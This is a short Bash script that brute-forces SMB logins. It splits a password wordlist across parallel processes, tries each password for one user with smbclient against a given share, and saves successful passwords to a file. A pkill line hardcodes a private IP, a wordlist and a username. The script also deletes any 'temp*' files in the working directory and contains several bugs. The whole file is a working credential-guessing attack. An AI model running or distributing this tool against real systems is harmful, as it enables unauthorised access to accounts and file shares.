#!/bin/bash


function bruteForce() {
lines="$(cat $2 | wc -l)"
num=0
list=$2
for i in $(cat "${list[@]}")
do
	smbclient -L $1 -U "$3%$i" 1>&2 > /dev/null
	if [ $? -eq 0 ]
	then
		echo -e "\033[31m$4\t[+] User: $3 \tpass:$i\033[0m\r"
		echo -e "$i" >> passSMB.txt
		for i in ${pids[@]}
		do
			#echo "$(ps -ef | grep -w $i)"
			#kill -9 "$i"
			pkill -f "/bin/bash ./smbBrutePass.sh //192.168.1.19/ contrasena.txt hope 5"
		done

		exit 0
	else
		echo -en "\t\t\t\t[-] User: $3\tpass:$i\r"
	fi
	num=$(($num+1))
	percentaje=$(($num*100/$lines*100))

	echo -e "$4[$num / $lines]\r"
done
echo "Ended process $4"
}

if [ $# -gt 4 ] || [ $# -eq 0 ]
then
	echo "Only 4 arguments"
	echo "Usage: ./smbBrute.sh <//IP/> <wordlist> <user> <processes>(optional: 2 default)"
	exit 1
fi
if [[ $1 = "-h" ]] || [[ $1 = "--help" ]]
then
	echo "Usage: ./smbBrute.sh <//IP/> <wordlist> <user> <processes>(optional: 2 default)"
	exit 0
fi
if [[ $4 = "4" ]]
then
	echo "Max 4 proc"
	exit 1
fi
if [[ $4 = "" ]]
then
	proc=2
else
	proc=$(($4))
fi

total="$(cat $2 | wc -l)"
numList=$(($total/$proc))
n=0
n2=1
pids=()
rm temp*
for i in $(seq $proc)
do
	n=$(($n+$numList))
	echo -e "$i -> n: $n\tn2:$n2"
	sed -n "${n2},${n}p" $2 > ./tempSMBbrute$i
	echo "Process: $i"
	bruteForce $1 ./tempSMBbrute$i $3 $i &
	pids+="$!"
	echo "Pid: ${pids[@]}"
	n2=$n
done

wait

rm ./tempSMBbrute*
